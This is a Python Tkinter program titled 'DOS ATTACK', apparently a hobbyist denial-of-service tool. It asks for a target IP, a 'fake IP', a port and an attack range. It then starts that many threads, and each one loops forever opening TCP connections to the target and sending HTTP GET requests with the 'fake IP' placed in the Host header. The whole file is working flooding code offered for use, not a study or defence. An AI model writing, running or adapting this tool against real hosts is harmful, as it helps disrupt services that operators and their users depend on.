from tkinter import *
from tkinter.ttk import Combobox
import tkinter.messagebox
import threading
import socket
import time




class Dos:
    def __init__(self,root):
        self.root=root
        self.root.title("DOS ATTACK")
        self.root.geometry("450x400")
        self.root.iconbitmap("logo980.ico")
        self.root.resizable(0,0)


        port=IntVar()
        target_address=StringVar()
        fake_ip=StringVar()
        attackrange=IntVar()




        def clear():
            fake_ip.set("")
            target_address.set("")
            port.set("Select Port Number")
            attackrange.set("Select Attack Range")




        def attack():
            try:
                if target_address.get()!="":
                    if fake_ip.get()!="":
                        if port.get()!="Select Port Number":
                            if attackrange.get()!="Select Attack Range":

                                while True:
                                    stream=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                                    stream.connect((target_address.get(),port.get()))
                                    stream.sendto((f"GET /{target_address.get()} HTTP/1.1\r\n").encode("ascii"),(target_address.get(),port.get()))
                                    stream.sendto((f"Host: {fake_ip.get()}\r\n\r\n").encode('ascii'),(target_address.get(),port.get()))
                                    stream.close()
                            else:
                                tkinter.messagebox.showerror("Error","Please Select Attack Range")


                        else:
                            tkinter.messagebox.showerror("Error","Please Select the port number")

                            
                    else:
                        tkinter.messagebox.showerror("Error","Please Enter A correct Fake Address")


                else:
                    tkinter.messagebox.showerror("Error","Please Enter A correct Target Address")

            except Exception as e:
                tkinter.messagebox.showerror("Error",e)


        def thread_attack():
            x=attackrange.get()
            for i in range(x):
                thread=threading.Thread(target=attack)
                time.sleep(4)
                thread.start()


        
        
        
            
           


        




#================mainframe===============================#
        
        mainframe=Frame(self.root,width=450,height=400,relief="ridge",bd=3)
        mainframe.place(x=0,y=0)

        firstframe=Frame(mainframe,width=444,height=340,relief="ridge",bd=3,bg="gray77")
        firstframe.place(x=0,y=0)

        secondframe=Frame(mainframe,width=444,height=53,relief="ridge",bd=3,bg="gray77")
        secondframe.place(x=0,y=340)

#=====================firstframe==================================#

        lab_target_ip=Label(firstframe,text="Enter Target IP Address",font=('times new roman',14),bg="gray77")
        lab_target_ip.place(x=120,y=4)

        ent_target_ip=Entry(firstframe,width=38,font=('times new roman',12),relief="ridge",bd=3,textvariable=target_address)
        ent_target_ip.place(x=60,y=40)

        lab_fake_ip=Label(firstframe,text="Enter Fake IP Address",font=('times new roman',14),bg="gray77")
        lab_fake_ip.place(x=120,y=100)

        ent_fake_ip=Entry(firstframe,width=38,font=('times new roman',12),relief="ridge",bd=3,textvariable=fake_ip)
        ent_fake_ip.place(x=60,y=140)


        ports=["80","20","21","22","23","25","50","51","53","67","68","69","110",\
               "119","123","135","139","143","161","162","389","443","989","990","3389"]
        ports_combo=Combobox(firstframe,values=ports,font=('arial',14),width=20,state="readonly",textvariable=port)
        ports_combo.set("Select Port Number")
        ports_combo.place(x=90,y=200)


        attack_range=list(range(100,1000,5))
        attack_range_combo=Combobox(firstframe,values=attack_range,font=('arial',14),width=20,state="readonly",textvariable=attackrange)
        attack_range_combo.set("Select Attack Range")
        attack_range_combo.place(x=90,y=260)


#=====================secondframe=================================#
        
        but_Attack=Button(secondframe,width=17,text="Attack",font=('times new roman',12),cursor="hand2",command=thread_attack)
        but_Attack.place(x=20,y=7)

        but_Clear=Button(secondframe,width=17,text="Clear",font=('times new roman',12),cursor="hand2",command=clear)
        but_Clear.place(x=250,y=7)





if __name__ == "__main__":
    root=Tk()
    Dos(root)
    root.mainloop()